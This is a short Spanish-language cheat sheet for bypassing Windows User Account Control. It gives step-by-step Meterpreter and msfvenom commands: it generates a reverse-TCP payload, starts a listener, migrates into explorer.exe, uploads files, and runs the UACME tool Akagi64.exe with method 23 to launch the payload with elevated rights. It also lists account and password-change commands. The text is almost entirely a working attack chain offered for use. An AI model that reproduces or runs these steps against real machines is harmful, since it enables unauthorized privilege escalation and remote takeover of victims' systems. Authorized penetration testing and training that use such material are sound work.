Técnicas para evadir UAC y ejecutar comandos con privilegios elevados.

• Permite elevar privilegios a administrador  
• Requiere sesión previa  
• Usa binarios confiables

## UACME

Herramienta para bypass de UAC.

https://github.com/hfiref0x/UACME

## Preparación (Meterpreter)

Buscar proceso estable:
	pgrep explorer

Migrar
	migrate PID

Ver privilegios
	getprivs

## Comandos útiles (Windows)

Usuarios:
	net user

Administradores:
	net localgroup administrators

Cambiar contraseña:
	net user user password

## Generar Payload

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= IP LPORT= PORT -f exe > name.exe
```

## Handler (Listener)

Escucha la conexión entrante del payload.

```
use /exploit/multi/handler
```
	set PAYLOAD windows/meterpreter/reverse_tcp
	set LHOST IP
	set LPORT PORT

## Subir archivos

	shell
	cd C:\\\\ 
	mkdir Temp 
	cd Temp
	exit

	upload name.exe
	upload Akagi64.exe

	shell 
	.\Akagi64.exe 23 C:\Temp\name.exe



• Migrar a explorer.exe antes de escalar  
• Usar rutas simples (C:\Temp)  
• Verificar arquitectura (x64/x86)  
• Requiere usuario en grupo admin
